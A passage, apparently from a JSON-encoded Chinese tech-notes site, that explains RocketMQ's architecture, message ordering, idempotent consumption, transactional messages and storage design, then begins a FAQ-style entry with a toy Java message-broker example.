，即使处理速度慢一点也无所谓，只要我们的系统没有崩溃就行了。\n留得江山在，还怕没柴烧？你敢说每次发送验证码的时候是一发你就收到了的么？\n消息队列能带来什么好处？    其实上面我已经说了。异步、解耦、削峰。 哪怕你上面的都没看懂也千万要记住这六个字，因为他不仅是消息队列的精华，更是编程和架构的精华。\n消息队列会带来副作用吗？    没有哪一门技术是“银弹”，消息队列也有它的副作用。\n比如，本来好好的两个系统之间的调用，我中间加了个消息队列，如果消息队列挂了怎么办呢？是不是 降低了系统的可用性 ？\n那这样是不是要保证HA(高可用)？是不是要搞集群？那么我 整个系统的复杂度是不是上升了 ？\n抛开上面的问题不讲，万一我发送方发送失败了，然后执行重试，这样就可能产生重复的消息。\n或者我消费端处理失败了，请求重发，这样也会产生重复的消息。\n对于一些微服务来说，消费重复消息会带来更大的麻烦，比如增加积分，这个时候我加了多次是不是对其他用户不公平？\n那么，又 如何解决重复消费消息的问题 呢？\n如果我们此时的消息需要保证严格的顺序性怎么办呢？比如生产者生产了一系列的有序消息(对一个id为1的记录进行删除增加修改)，但是我们知道在发布订阅模型中，对于主题是无顺序的，那么这个时候就会导致对于消费者消费消息的时候没有按照生产者的发送顺序消费，比如这个时候我们消费的顺序为修改删除增加，如果该记录涉及到金额的话是不是会出大事情？\n那么，又 如何解决消息的顺序消费问题 呢？\n就拿我们上面所讲的分布式系统来说，用户购票完成之后是不是需要增加账户积分？在同一个系统中我们一般会使用事务来进行解决，如果用 Spring 的话我们在上面伪代码中加入 @Transactional 注解就好了。但是在不同系统中如何保证事务呢？总不能这个系统我扣钱成功了你那积分系统积分没加吧？或者说我这扣钱明明失败了，你那积分系统给我加了积分。\n那么，又如何 解决分布式事务问题 呢？\n我们刚刚说了，消息队列可以进行削峰操作，那如果我的消费者如果消费很慢或者生产者生产消息很快，这样是不是会将消息堆积在消息队列中？\n那么，又如何 解决消息堆积的问题 呢？\n可用性降低，复杂度上升，又带来一系列的重复消费，顺序消费，分布式事务，消息堆积的问题，这消息队列还怎么用啊😵？\n别急，办法总是有的。\nRocketMQ是什么？    哇，你个混蛋！上面给我抛出那么多问题，你现在又讲 RocketMQ ，还让不让人活了？！🤬\n别急别急，话说你现在清楚 MQ 的构造吗，我还没讲呢，我们先搞明白 MQ 的内部构造，再来看看如何解决上面的一系列问题吧，不过你最好带着问题去阅读和了解喔。\nRocketMQ 是一个 队列模型 的消息中间件，具有高性能、高可靠、高实时、分布式 的特点。它是一个采用 Java 语言开发的分布式的消息系统，由阿里巴巴团队开发，在2016年底贡献给 Apache，成为了 Apache 的一个顶级项目。 在阿里内部，RocketMQ 很好地服务了集团大大小小上千个应用，在每年的双十一当天，更有不可思议的万亿级消息通过 RocketMQ 流转。\n废话不多说，想要了解 RocketMQ 历史的同学可以自己去搜寻资料。听完上面的介绍，你只要知道 RocketMQ 很快、很牛、而且经历过双十一的实践就行了！\n队列模型和主题模型    在谈 RocketMQ 的技术架构之前，我们先来了解一下两个名词概念——队列模型 和 主题模型 。\n首先我问一个问题，消息队列为什么要叫消息队列？\n你可能觉得很弱智，这玩意不就是存放消息的队列嘛？不叫消息队列叫什么？\n的确，早期的消息中间件是通过 队列 这一模型来实现的，可能是历史原因，我们都习惯把消息中间件成为消息队列。\n但是，如今例如 RocketMQ 、Kafka 这些优秀的消息中间件不仅仅是通过一个 队列 来实现消息存储的。\n队列模型    就像我们理解队列一样，消息中间件的队列模型就真的只是一个队列。。。我画一张图给大家理解。\n在一开始我跟你提到了一个 “广播” 的概念，也就是说如果我们此时我们需要将一个消息发送给多个消费者(比如此时我需要将信息发送给短信系统和邮件系统)，这个时候单个队列即不能满足需求了。\n当然你可以让 Producer 生产消息放入多个队列中，然后每个队列去对应每一个消费者。问题是可以解决，创建多个队列并且复制多份消息是会很影响资源和性能的。而且，这样子就会导致生产者需要知道具体消费者个数然后去复制对应数量的消息队列，这就违背我们消息中间件的 解耦 这一原则。\n主题模型    那么有没有好的方法去解决这一个问题呢？有，那就是 主题模型 或者可以称为 发布订阅模型 。\n 感兴趣的同学可以去了解一下设计模式里面的观察者模式并且手动实现一下，我相信你会有所收获的。\n 在主题模型中，消息的生产者称为 发布者(Publisher) ，消息的消费者称为 订阅者(Subscriber) ，存放消息的容器称为 主题(Topic) 。\n其中，发布者将消息发送到指定主题中，订阅者需要 提前订阅主题 才能接受特定主题的消息。\nRocketMQ中的消息模型    RocketMQ 中的消息模型就是按照 主题模型 所实现的。你可能会好奇这个 主题 到底是怎么实现的呢？你上面也没有讲到呀！\n其实对于主题模型的实现来说每个消息中间件的底层设计都是不一样的，就比如 Kafka 中的 分区 ，RocketMQ 中的 队列 ，RabbitMQ 中的 Exchange 。我们可以理解为 主题模型/发布订阅模型 就是一个标准，那些中间件只不过照着这个标准去实现而已。\n所以，RocketMQ 中的 主题模型 到底是如何实现的呢？首先我画一张图，大家尝试着去理解一下。\n我们可以看到在整个图中有 Producer Group 、Topic 、Consumer Group 三个角色，我来分别介绍一下他们。\n Producer Group 生产者组： 代表某一类的生产者，比如我们有多个秒杀系统作为生产者，这多个合在一起就是一个 Producer Group 生产者组，它们一般生产相同的消息。 Consumer Group 消费者组： 代表某一类的消费者，比如我们有多个短信系统作为消费者，这多个合在一起就是一个 Consumer Group 消费者组，它们一般消费相同的消息。 Topic 主题： 代表一类消息，比如订单消息，物流消息等等。  你可以看到图中生产者组中的生产者会向主题发送消息，而 主题中存在多个队列，生产者每次生产消息之后是指定主题中的某个队列发送消息的。\n每个主题中都有多个队列(分布在不同的 Broker中，如果是集群的话，Broker又分布在不同的服务器中)，集群消费模式下，一个消费者集群多台机器共同消费一个 topic 的多个队列，一个队列只会被一个消费者消费。如果某个消费者挂掉，分组内其它消费者会接替挂掉的消费者继续消费。就像上图中 Consumer1 和 Consumer2 分别对应着两个队列，而 Consumer3 是没有队列对应的，所以一般来讲要控制 消费者组中的消费者个数和主题中队列个数相同 。\n当然也可以消费者个数小于队列个数，只不过不太建议。如下图。\n每个消费组在每个队列上维护一个消费位置 ，为什么呢？\n因为我们刚刚画的仅仅是一个消费者组，我们知道在发布订阅模式中一般会涉及到多个消费者组，而每个消费者组在每个队列中的消费位置都是不同的。如果此时有多个消费者组，那么消息被一个消费者组消费完之后是不会删除的(因为其它消费者组也需要呀)，它仅仅是为每个消费者组维护一个 消费位移(offset) ，每次消费者组消费完会返回一个成功的响应，然后队列再把维护的消费位移加一，这样就不会出现刚刚消费过的消息再一次被消费了。\n可能你还有一个问题，为什么一个主题中需要维护多个队列 ？\n答案是 提高并发能力 。的确，每个主题中只存在一个队列也是可行的。你想一下，如果每个主题中只存在一个队列，这个队列中也维护着每个消费者组的消费位置，这样也可以做到 发布订阅模式 。如下图。\n但是，这样我生产者是不是只能向一个队列发送消息？又因为需要维护消费位置所以一个队列只能对应一个消费者组中的消费者，这样是不是其他的 Consumer 就没有用武之地了？从这两个角度来讲，并发度一下子就小了很多。\n所以总结来说，RocketMQ 通过使用在一个 Topic 中配置多个队列并且每个队列维护每个消费者组的消费位置 实现了 主题模式/发布订阅模式 。\nRocketMQ的架构图    讲完了消息模型，我们理解起 RocketMQ 的技术架构起来就容易多了。\nRocketMQ 技术架构中有四大角色 NameServer 、Broker 、Producer 、Consumer 。我来向大家分别解释一下这四个角色是干啥的。\n  Broker： 主要负责消息的存储、投递和查询以及服务高可用保证。说白了就是消息队列服务器嘛，生产者生产消息到 Broker ，消费者从 Broker 拉取消息并消费。\n这里，我还得普及一下关于 Broker 、Topic 和 队列的关系。上面我讲解了 Topic 和队列的关系——一个 Topic 中存在多个队列，那么这个 Topic 和队列存放在哪呢？\n一个 Topic 分布在多个 Broker上，一个 Broker 可以配置多个 Topic ，它们是多对多的关系。\n如果某个 Topic 消息量很大，应该给它多配置几个队列(上文中提到了提高并发能力)，并且 尽量多分布在不同 Broker 上，以减轻某个 Broker 的压力 。\nTopic 消息量都比较均匀的情况下，如果某个 broker 上的队列越多，则该 broker 压力越大。\n 所以说我们需要配置多个Broker。\n   NameServer： 不知道你们有没有接触过 ZooKeeper 和 Spring Cloud 中的 Eureka ，它其实也是一个 注册中心 ，主要提供两个功能：Broker管理 和 路由信息管理 。说白了就是 Broker 会将自己的信息注册到 NameServer 中，此时 NameServer 就存放了很多 Broker 的信息(Broker的路由表)，消费者和生产者就从 NameServer 中获取路由表然后照着路由表的信息和对应的 Broker 进行通信(生产者和消费者定期会向 NameServer 去查询相关的 Broker 的信息)。\n  Producer： 消息发布的角色，支持分布式集群方式部署。说白了就是生产者。\n  Consumer： 消息消费的角色，支持分布式集群方式部署。支持以push推，pull拉两种模式对消息进行消费。同时也支持集群方式和广播方式的消费，它提供实时消息订阅机制。说白了就是消费者。\n  听完了上面的解释你可能会觉得，这玩意好简单。不就是这样的么？\n嗯？你可能会发现一个问题，这老家伙 NameServer 干啥用的，这不多余吗？直接 Producer 、Consumer 和 Broker 直接进行生产消息，消费消息不就好了么？\n但是，我们上文提到过 Broker 是需要保证高可用的，如果整个系统仅仅靠着一个 Broker 来维持的话，那么这个 Broker 的压力会不会很大？所以我们需要使用多个 Broker 来保证 负载均衡 。\n如果说，我们的消费者和生产者直接和多个 Broker 相连，那么当 Broker 修改的时候必定会牵连着每个生产者和消费者，这样就会产生耦合问题，而 NameServer 注册中心就是用来解决这个问题的。\n 如果还不是很理解的话，可以去看我介绍 Spring Cloud 的那篇文章，其中介绍了 Eureka 注册中心。\n 当然，RocketMQ 中的技术架构肯定不止前面那么简单，因为上面图中的四个角色都是需要做集群的。我给出一张官网的架构图，大家尝试理解一下。\n其实和我们最开始画的那张乞丐版的架构图也没什么区别，主要是一些细节上的差别。听我细细道来🤨。\n第一、我们的 Broker 做了集群并且还进行了主从部署 ，由于消息分布在各个 Broker 上，一旦某个 Broker 宕机，则该Broker 上的消息读写都会受到影响。所以 Rocketmq 提供了 master/slave 的结构， salve 定时从 master 同步数据(同步刷盘或者异步刷盘)，如果 master 宕机，则 slave 提供消费服务，但是不能写入消息 (后面我还会提到哦)。\n第二、为了保证 HA ，我们的 NameServer 也做了集群部署，但是请注意它是 去中心化 的。也就意味着它没有主节点，你可以很明显地看出 NameServer 的所有节点是没有进行 Info Replicate 的，在 RocketMQ 中是通过 单个Broker和所有NameServer保持长连接 ，并且在每隔30秒 Broker 会向所有 Nameserver 发送心跳，心跳包含了自身的 Topic 配置信息，这个步骤就对应这上面的 Routing Info 。\n第三、在生产者需要向 Broker 发送消息的时候，需要先从 NameServer 获取关于 Broker 的路由信息，然后通过 轮询 的方法去向每个队列中生产数据以达到 负载均衡 的效果。\n第四、消费者通过 NameServer 获取所有 Broker 的路由信息后，向 Broker 发送 Pull 请求来获取消息数据。Consumer 可以以两种模式启动—— 广播（Broadcast）和集群（Cluster）。广播模式下，一条消息会发送给 同一个消费组中的所有消费者 ，集群模式下消息只会发送给一个消费者。\n如何解决 顺序消费、重复消费    其实，这些东西都是我在介绍消息队列带来的一些副作用的时候提到的，也就是说，这些问题不仅仅挂钩于 RocketMQ ，而是应该每个消息中间件都需要去解决的。\n在上面我介绍 RocketMQ 的技术架构的时候我已经向你展示了 它是如何保证高可用的 ，这里不涉及运维方面的搭建，如果你感兴趣可以自己去官网上照着例子搭建属于你自己的 RocketMQ 集群。\n 其实 Kafka 的架构基本和 RocketMQ 类似，只是它注册中心使用了 Zookeeper 、它的 分区 就相当于 RocketMQ 中的 队列 。还有一些小细节不同会在后面提到。\n 顺序消费    在上面的技术架构介绍中，我们已经知道了 RocketMQ 在主题上是无序的、它只有在队列层面才是保证有序 的。\n这又扯到两个概念——普通顺序 和 严格顺序 。\n所谓普通顺序是指 消费者通过 同一个消费队列收到的消息是有顺序的 ，不同消息队列收到的消息则可能是无顺序的。普通顺序消息在 Broker 重启情况下不会保证消息顺序性 (短暂时间) 。\n所谓严格顺序是指 消费者收到的 所有消息 均是有顺序的。严格顺序消息 即使在异常情况下也会保证消息的顺序性 。\n但是，严格顺序看起来虽好，实现它可会付出巨大的代价。如果你使用严格顺序模式，Broker 集群中只要有一台机器不可用，则整个集群都不可用。你还用啥？现在主要场景也就在 binlog 同步。\n一般而言，我们的 MQ 都是能容忍短暂的乱序，所以推荐使用普通顺序模式。\n那么，我们现在使用了 普通顺序模式 ，我们从上面学习知道了在 Producer 生产消息的时候会进行轮询(取决你的负载均衡策略)来向同一主题的不同消息队列发送消息。那么如果此时我有几个消息分别是同一个订单的创建、支付、发货，在轮询的策略下这 三个消息会被发送到不同队列 ，因为在不同的队列此时就无法使用 RocketMQ 带来的队列有序特性来保证消息有序性了。\n那么，怎么解决呢？\n其实很简单，我们需要处理的仅仅是将同一语义下的消息放入同一个队列(比如这里是同一个订单)，那我们就可以使用 Hash取模法 来保证同一个订单在同一个队列中就行了。\n重复消费    emmm，就两个字—— 幂等 。在编程中一个幂等 操作的特点是其任意多次执行所产生的影响均与一次执行的影响相同。比如说，这个时候我们有一个订单的处理积分的系统，每当来一个消息的时候它就负责为创建这个订单的用户的积分加上相应的数值。可是有一次，消息队列发送给订单系统 FrancisQ 的订单信息，其要求是给 FrancisQ 的积分加上 500。但是积分系统在收到 FrancisQ 的订单信息处理完成之后返回给消息队列处理成功的信息的时候出现了网络波动(当然还有很多种情况，比如Broker意外重启等等)，这条回应没有发送成功。\n那么，消息队列没收到积分系统的回应会不会尝试重发这个消息？问题就来了，我再发这个消息，万一它又给 FrancisQ 的账户加上 500 积分怎么办呢？\n所以我们需要给我们的消费者实现 幂等 ，也就是对同一个消息的处理结果，执行多少次都不变。\n那么如何给业务实现幂等呢？这个还是需要结合具体的业务的。你可以使用 写入 Redis 来保证，因为 Redis 的 key 和 value 就是天然支持幂等的。当然还有使用 数据库插入法 ，基于数据库的唯一键来保证重复数据不会被插入多条。\n不过最主要的还是需要 根据特定场景使用特定的解决方案 ，你要知道你的消息消费是否是完全不可重复消费还是可以忍受重复消费的，然后再选择强校验和弱校验的方式。毕竟在 CS 领域还是很少有技术银弹的说法。\n而在整个互联网领域，幂等不仅仅适用于消息队列的重复消费问题，这些实现幂等的方法，也同样适用于，在其他场景中来解决重复请求或者重复调用的问题 。比如将HTTP服务设计成幂等的，解决前端或者APP重复提交表单数据的问题 ，也可以将一个微服务设计成幂等的，解决 RPC 框架自动重试导致的 重复调用问题 。\n分布式事务    如何解释分布式事务呢？事务大家都知道吧？要么都执行要么都不执行 。在同一个系统中我们可以轻松地实现事务，但是在分布式架构中，我们有很多服务是部署在不同系统之间的，而不同服务之间又需要进行调用。比如此时我下订单然后增加积分，如果保证不了分布式事务的话，就会出现A系统下了订单，但是B系统增加积分失败或者A系统没有下订单，B系统却增加了积分。前者对用户不友好，后者对运营商不利，这是我们都不愿意见到的。\n那么，如何去解决这个问题呢？\n如今比较常见的分布式事务实现有 2PC、TCC 和事务消息(half 半消息机制)。每一种实现都有其特定的使用场景，但是也有各自的问题，都不是完美的解决方案。\n在 RocketMQ 中使用的是 事务消息加上事务反查机制 来解决分布式事务问题的。我画了张图，大家可以对照着图进行理解。\n在第一步发送的 half 消息 ，它的意思是 在事务提交之前，对于消费者来说，这个消息是不可见的 。\n 那么，如何做到写入消息但是对用户不可见呢？RocketMQ事务消息的做法是：如果消息是half消息，将备份原消息的主题与消息消费队列，然后 改变主题 为RMQ_SYS_TRANS_HALF_TOPIC。由于消费组未订阅该主题，故消费端无法消费half类型的消息，然后RocketMQ会开启一个定时任务，从Topic为RMQ_SYS_TRANS_HALF_TOPIC中拉取消息进行消费，根据生产者组获取一个服务提供者发送回查事务状态请求，根据事务状态来决定是提交或回滚消息。\n 你可以试想一下，如果没有从第5步开始的 事务反查机制 ，如果出现网路波动第4步没有发送成功，这样就会产生 MQ 不知道是不是需要给消费者消费的问题，他就像一个无头苍蝇一样。在 RocketMQ 中就是使用的上述的事务反查来解决的，而在 Kafka 中通常是直接抛出一个异常让用户来自行解决。\n你还需要注意的是，在 MQ Server 指向系统B的操作已经和系统A不相关了，也就是说在消息队列中的分布式事务是——本地事务和存储消息到消息队列才是同一个事务。这样也就产生了事务的最终一致性，因为整个过程是异步的，每个系统只要保证它自己那一部分的事务就行了。\n消息堆积问题    在上面我们提到了消息队列一个很重要的功能——削峰 。那么如果这个峰值太大了导致消息堆积在队列中怎么办呢？\n其实这个问题可以将它广义化，因为产生消息堆积的根源其实就只有两个——生产者生产太快或者消费者消费太慢。\n我们可以从多个角度去思考解决这个问题，当流量到峰值的时候是因为生产者生产太快，我们可以使用一些 限流降级 的方法，当然你也可以增加多个消费者实例去水平扩展增加消费能力来匹配生产的激增。如果消费者消费过慢的话，我们可以先检查 是否是消费者出现了大量的消费错误 ，或者打印一下日志查看是否是哪一个线程卡死，出现了锁资源不释放等等的问题。\n 当然，最快速解决消息堆积问题的方法还是增加消费者实例，不过 同时你还需要增加每个主题的队列数量 。\n别忘了在 RocketMQ 中，一个队列只会被一个消费者消费 ，如果你仅仅是增加消费者实例就会出现我一开始给你画架构图的那种情况。\n 回溯消费    回溯消费是指 Consumer 已经消费成功的消息，由于业务上需求需要重新消费，在RocketMQ 中， Broker 在向Consumer 投递成功消息后，消息仍然需要保留 。并且重新消费一般是按照时间维度，例如由于 Consumer 系统故障，恢复后需要重新消费1小时前的数据，那么 Broker 要提供一种机制，可以按照时间维度来回退消费进度。RocketMQ 支持按照时间回溯消费，时间维度精确到毫秒。\n这是官方文档的解释，我直接照搬过来就当科普了😁😁😁。\nRocketMQ 的刷盘机制    上面我讲了那么多的 RocketMQ 的架构和设计原理，你有没有好奇\n在 Topic 中的 队列是以什么样的形式存在的？\n队列中的消息又是如何进行存储持久化的呢？\n我在上文中提到的 同步刷盘 和 异步刷盘 又是什么呢？它们会给持久化带来什么样的影响呢？\n下面我将给你们一一解释。\n同步刷盘和异步刷盘    如上图所示，在同步刷盘中需要等待一个刷盘成功的 ACK ，同步刷盘对 MQ 消息可靠性来说是一种不错的保障，但是 性能上会有较大影响 ，一般地适用于金融等特定业务场景。\n而异步刷盘往往是开启一个线程去异步地执行刷盘操作。消息刷盘采用后台异步线程提交的方式进行， 降低了读写延迟 ，提高了 MQ 的性能和吞吐量，一般适用于如发验证码等对于消息保证要求不太高的业务场景。\n一般地，异步刷盘只有在 Broker 意外宕机的时候会丢失部分数据，你可以设置 Broker 的参数 FlushDiskType 来调整你的刷盘策略(ASYNC_FLUSH 或者 SYNC_FLUSH)。\n同步复制和异步复制    上面的同步刷盘和异步刷盘是在单个结点层面的，而同步复制和异步复制主要是指的 Borker 主从模式下，主节点返回消息给客户端的时候是否需要同步从节点。\n 同步复制： 也叫 “同步双写”，也就是说，只有消息同步双写到主从结点上时才返回写入成功 。 异步复制： 消息写入主节点之后就直接返回写入成功 。  然而，很多事情是没有完美的方案的，就比如我们进行消息写入的节点越多就更能保证消息的可靠性，但是随之的性能也会下降，所以需要程序员根据特定业务场景去选择适应的主从复制方案。\n那么，异步复制会不会也像异步刷盘那样影响消息的可靠性呢？\n答案是不会的，因为两者就是不同的概念，对于消息可靠性是通过不同的刷盘策略保证的，而像异步同步复制策略仅仅是影响到了 可用性 。为什么呢？其主要原因是 RocketMQ 是不支持自动主从切换的，当主节点挂掉之后，生产者就不能再给这个主节点生产消息了。\n比如这个时候采用异步复制的方式，在主节点还未发送完需要同步的消息的时候主节点挂掉了，这个时候从节点就少了一部分消息。但是此时生产者无法再给主节点生产消息了，消费者可以自动切换到从节点进行消费(仅仅是消费)，所以在主节点挂掉的时间只会产生主从结点短暂的消息不一致的情况，降低了可用性，而当主节点重启之后，从节点那部分未来得及复制的消息还会继续复制。\n在单主从架构中，如果一个主节点挂掉了，那么也就意味着整个系统不能再生产了。那么这个可用性的问题能否解决呢？一个主从不行那就多个主从的呗，别忘了在我们最初的架构图中，每个 Topic 是分布在不同 Broker 中的。\n但是这种复制方式同样也会带来一个问题，那就是无法保证 严格顺序 。在上文中我们提到了如何保证的消息顺序性是通过将一个语义的消息发送在同一个队列中，使用 Topic 下的队列来保证顺序性的。如果此时我们主节点A负责的是订单A的一系列语义消息，然后它挂了，这样其他节点是无法代替主节点A的，如果我们任意节点都可以存入任何消息，那就没有顺序性可言了。\n而在 RocketMQ 中采用了 Dledger 解决这个问题。他要求在写入消息的时候，要求至少消息复制到半数以上的节点之后，才给客⼾端返回写⼊成功，并且它是⽀持通过选举来动态切换主节点的。这里我就不展开说明了，读者可以自己去了解。\n 也不是说 Dledger 是个完美的方案，至少在 Dledger 选举过程中是无法提供服务的，而且他必须要使用三个节点或以上，如果多数节点同时挂掉他也是无法保证可用性的，而且要求消息复制半数以上节点的效率和直接异步复制还是有一定的差距的。\n 存储机制    还记得上面我们一开始的三个问题吗？到这里第三个问题已经解决了。\n但是，在 Topic 中的 队列是以什么样的形式存在的？队列中的消息又是如何进行存储持久化的呢？ 还未解决，其实这里涉及到了 RocketMQ 是如何设计它的存储结构了。我首先想大家介绍 RocketMQ 消息存储架构中的三大角色——CommitLog 、ConsumeQueue 和 IndexFile 。\n CommitLog： 消息主体以及元数据的存储主体，存储 Producer 端写入的消息主体内容,消息内容不是定长的。单个文件大小默认1G ，文件名长度为20位，左边补零，剩余为起始偏移量，比如00000000000000000000代表了第一个文件，起始偏移量为0，文件大小为1G=1073741824；当第一个文件写满了，第二个文件为00000000001073741824，起始偏移量为1073741824，以此类推。消息主要是顺序写入日志文件，当文件满了，写入下一个文件。 ConsumeQueue： 消息消费队列，引入的目的主要是提高消息消费的性能(我们再前面也讲了)，由于RocketMQ 是基于主题 Topic 的订阅模式，消息消费是针对主题进行的，如果要遍历 commitlog 文件中根据 Topic 检索消息是非常低效的。Consumer 即可根据 ConsumeQueue 来查找待消费的消息。其中，ConsumeQueue（逻辑消费队列）作为消费消息的索引，保存了指定 Topic 下的队列消息在 CommitLog 中的起始物理偏移量 offset ，消息大小 size 和消息 Tag 的 HashCode 值。consumequeue 文件可以看成是基于 topic 的 commitlog 索引文件，故 consumequeue 文件夹的组织方式如下：topic/queue/file三层组织结构，具体存储路径为：$HOME/store/consumequeue/{topic}/{queueId}/{fileName}。同样 consumequeue 文件采取定长设计，每一个条目共20个字节，分别为8字节的 commitlog 物理偏移量、4字节的消息长度、8字节tag hashcode，单个文件由30W个条目组成，可以像数组一样随机访问每一个条目，每个 ConsumeQueue文件大小约5.72M； IndexFile： IndexFile（索引文件）提供了一种可以通过key或时间区间来查询消息的方法。这里只做科普不做详细介绍。  总结来说，整个消息存储的结构，最主要的就是 CommitLoq 和 ConsumeQueue 。而 ConsumeQueue 你可以大概理解为 Topic 中的队列。\nRocketMQ 采用的是 混合型的存储结构 ，即为 Broker 单个实例下所有的队列共用一个日志数据文件来存储消息。有意思的是在同样高并发的 Kafka 中会为每个 Topic 分配一个存储文件。这就有点类似于我们有一大堆书需要装上书架，RockeMQ 是不分书的种类直接成批的塞上去的，而 Kafka 是将书本放入指定的分类区域的。\n而 RocketMQ 为什么要这么做呢？原因是 提高数据的写入效率 ，不分 Topic 意味着我们有更大的几率获取 成批 的消息进行数据写入，但也会带来一个麻烦就是读取消息的时候需要遍历整个大文件，这是非常耗时的。\n所以，在 RocketMQ 中又使用了 ConsumeQueue 作为每个队列的索引文件来 提升读取消息的效率。我们可以直接根据队列的消息序号，计算出索引的全局位置（索引序号*索引固定⻓度20），然后直接读取这条索引，再根据索引中记录的消息的全局位置，找到消息。\n讲到这里，你可能对 RockeMQ 的存储架构还有些模糊，没事，我们结合着图来理解一下。\nemmm，是不是有一点复杂🤣，看英文图片和英文文档的时候就不要怂，硬着头皮往下看就行。\n 如果上面没看懂的读者一定要认真看下面的流程分析！\n 首先，在最上面的那一块就是我刚刚讲的你现在可以直接 把 ConsumerQueue 理解为 Queue。\n在图中最左边说明了 红色方块  代表被写入的消息，虚线方块代表等待被写入的。左边的生产者发送消息会指定 Topic 、QueueId 和具体消息内容，而在 Broker 中管你是哪门子消息，他直接 全部顺序存储到了 CommitLog。而根据生产者指定的 Topic 和 QueueId 将这条消息本身在 CommitLog 的偏移(offset)，消息本身大小，和tag的hash值存入对应的 ConsumeQueue 索引文件中。而在每个队列中都保存了 ConsumeOffset 即每个消费者组的消费位置(我在架构那里提到了，忘了的同学可以回去看一下)，而消费者拉取消息进行消费的时候只需要根据 ConsumeOffset 获取下一个未被消费的消息就行了。\n上述就是我对于整个消息存储架构的大概理解(这里不涉及到一些细节讨论，比如稀疏索引等等问题)，希望对你有帮助。\n因为有一个知识点因为写嗨了忘讲了，想想在哪里加也不好，所以我留给大家去思考🤔🤔一下吧。\n为什么 CommitLog 文件要设计成固定大小的长度呢？提醒：内存映射机制。\n总结    总算把这篇博客写完了。我讲的你们还记得吗😅？\n这篇文章中我主要想大家介绍了\n 消息队列出现的原因 消息队列的作用(异步，解耦，削峰) 消息队列带来的一系列问题(消息堆积、重复消费、顺序消费、分布式事务等等) 消息队列的两种消息模型——队列和主题模式 分析了 RocketMQ 的技术架构(NameServer 、Broker 、Producer 、Comsumer) 结合 RocketMQ 回答了消息队列副作用的解决方案 介绍了 RocketMQ 的存储机制和刷盘策略。  等等。。。\n 如果喜欢可以点赞哟👍👍👍。\n "},{"id":296,"href":"/system-design/distributed-system/message-queue/RocketMQ-Questions/","title":"RocketMQ-Questions","parent":"message-queue","content":"本文来自读者 PR。\n 1 单机版消息中心 2 分布式消息中心  2.1 问题与解决  2.1.1 消息丢失的问题 2.1.2 同步落盘怎么才能快 2.1.3 消息堆积的问题 2.1.4 定时消息的实现 2.1.5 顺序消息的实现 2.1.6 分布式消息的实现 2.1.7 消息的 push 实现 2.1.8 消息重复发送的避免 2.1.9 广播消费与集群消费 2.1.10 RocketMQ 不使用 ZooKeeper 作为注册中心的原因，以及自制的 NameServer 优缺点？ 2.1.11 其它     3 参考  1 单机版消息中心    一个消息中心，最基本的需要支持多生产者、多消费者，例如下：\nclass Scratch { public static void main(String[] args) { // 实际中会有 nameserver 服务来找到 broker 具体位置以及 broker 主从信息  Broker broker = new Broker(); Producer producer1 = new Producer(); producer1.connectBroker(broker); Producer producer2 = new Producer(); producer2.connectBroker(broker); Consumer consumer1 = new Consumer(); consumer1.connectBroker(broker); Consumer consumer2 = new Consumer(); consumer2.connectBroker(broker); for (int i = 0; i \u0026lt; 2; i++) { producer1.asyncSendMsg(\u0026#34;producer1 send msg\u0026#34; + i); producer2.asyncSendMsg(\u0026#34;producer2 send msg\u0026#34; + i); } System.out.println(\u0026#34;broker has msg:\u0026#34; + broker.getAllMagByDisk()); for (int i = 0; i \u0026lt; 1; i++) { System.out.println(\u0026#34;consumer1 consume msg：\u0026#34; + consumer1.syncPullMsg()); } for (int i = 0; i \u0026lt; 3; i++) { System.out.println(\u0026#34;consumer2 consume msg：\u0026#34; + consumer2.syncPullMsg()); } } } class Producer { private Broker broker; public void connectBroker(Broker broker) { this.broker = broker; } public void asyncSendMsg(String msg) { if (broker == null) { throw new RuntimeException(\u0026#34;please connect broker first\u0026#34;); } new Thread(() -\u0026gt; { broker.sendMsg(msg); }).start(); } } class Consumer { private Broker broker; public void connectBroker(Broker broker) { this.broker = broker; } public String syncPullMsg() { return broker.getMsg(); } } class Broker { // 对应 RocketMQ 中 MessageQueue，默认情况下 1 个 Topic 包含 4 个 MessageQueue  private LinkedBlockingQueue\u0026lt;String\u0026gt; messageQueue = new LinkedBlockingQueue(Integer.MAX_VALUE); // 实际发送消息到 broker 服务器使用 Netty 发送  public void sendMsg(String msg) { try { messageQueue.put(msg); // 实际会同步或异步落盘，异步落盘使用的定时任务定时扫描落盘  } catch (InterruptedException e) { } } public String getMsg() { try { return messageQueue.take(); } catch (InterruptedException e) { } return null; } public String getAllMagByDisk() { StringBuilder sb = new StringBuilder(\u0026#34;\\n\u0026#34;); messageQueue.iterator().forEachRemaining((msg) -\u0026gt; { sb.append(msg + \u0026#34;\\n\u0026#34;); }); return sb.toString(); } } 问题：\n 没有实现真正执行消息存储落盘 没有实现 NameServer 去作为注册中心，定位服务 使用 LinkedBlockingQueue 作为消息队列，注意，参数是无限大，在真正 RocketMQ 也是如此是无限大，理论上不会出现对进来的数据进行抛弃，但是会有内存泄漏问题（阿里巴巴开发手册也因为这个问题，建议我们使用自制线程池） 没有使用多个队列（即多个 LinkedBlockingQueue），RocketMQ 的顺序消息是通过生产者和消费者同时使用同一个 MessageQueue 来实现，但是如果我们只有一个 MessageQueue，那我们天然就支持顺序消息 没有使用 MappedByteBuffer 来实现文件映射从而使消息数据落盘非常的快（实际 RocketMQ 使用的是 FileChannel+DirectBuffer）  2 分布式消息中心    2.1 问题与解决    2.1.1 消息丢失的问题     当你系统需要保证百分百消息不丢失，你可以使用生产者每发送一个消息，Broker 同步返回一个消息发送成功的反馈消息 即每发送一个消息，同步落盘后才返回生产者消息发送成功，这样只要生产者得到了消息发送生成的返回，事后除了硬盘损坏，都可以保证不会消息丢失 但是这同时引入了一个问题，同步落盘怎么才能快？  2.1.2 同步落盘怎么才能快     使用 FileChannel + DirectBuffer 池，使用堆外内存，加快内存拷贝 使用数据和索引分离，当消息需要写入时，使用 commitlog 文件顺序写，当需要定位某个消息时，查询index 文件来定位，从而减少文件IO随机读写的性能损耗  2.1.3 消息堆积的问题     后台定时任务每隔72小时，删除旧的没有使用过的消息信息 根据不同的业务实现不同的丢弃任务，具体参考线程池的 AbortPolicy，例如FIFO/LRU等（RocketMQ没有此策略） 消息定时转移，或者对某些重要的 TAG 型（支付型）消息真正落库  2.1.4 定时消息的实现     实际 RocketMQ 没有实现任意精度的定时消息，它只支持某些特定的时间精度的定时消息 实现定时消息的原理是：创建特定时间精度的 MessageQueue，例如生产者需要定时1s之后被消费者消费，你只需要将此消息发送到特定的 Topic，例如：MessageQueue-1 表示这个 MessageQueue 里面的消息都会延迟一秒被消费，然后 Broker 会在 1s 后发送到消费者消费此消息，使用 